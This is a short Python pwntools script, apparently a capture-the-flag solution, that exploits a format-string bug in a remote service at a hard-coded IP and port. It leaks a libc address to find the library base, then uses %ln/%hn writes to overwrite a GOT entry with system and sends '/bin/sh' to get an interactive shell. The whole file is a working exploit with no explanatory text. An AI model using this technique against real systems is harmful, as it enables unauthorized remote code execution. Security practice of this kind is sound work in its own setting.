from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
p = remote('183.129.189.60',10003)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p = process('./pwn')
pay="%3$p"
p.sendlineafter(": \n",pay)
base=int(p.readline(),16)-(0x7ffff7b04260-0x7ffff7a0d000)
log.warning(hex(base))

libc.address=base
one=libc.sym['system']
p1=one&0xffff
r2=(one>>16)&0xffff
r3=(one>>32)&0xffff
def cal(a,b):
	if(b<a):
		return 0x10000+b-a
	return b-a
p2=cal(p1,r2)
p3=cal(r2,r3)
aim=0x000000000601028
pay="%{}c%70$ln%{}c%71$hn%{}c%72$hn".format(p1,p2,p3).ljust(0x200,'\x00')+p64(aim)+p64(aim+2)+p64(aim+4)
p.sendafter(": \n",pay.ljust(0x400,'\x00'))
log.warning(hex(p1))
log.warning(hex(p2))
log.warning(hex(p3))
p.sendlineafter(": \n",str('/bin/sh\x00'))
#gdb.attach(p)
p.interactive()
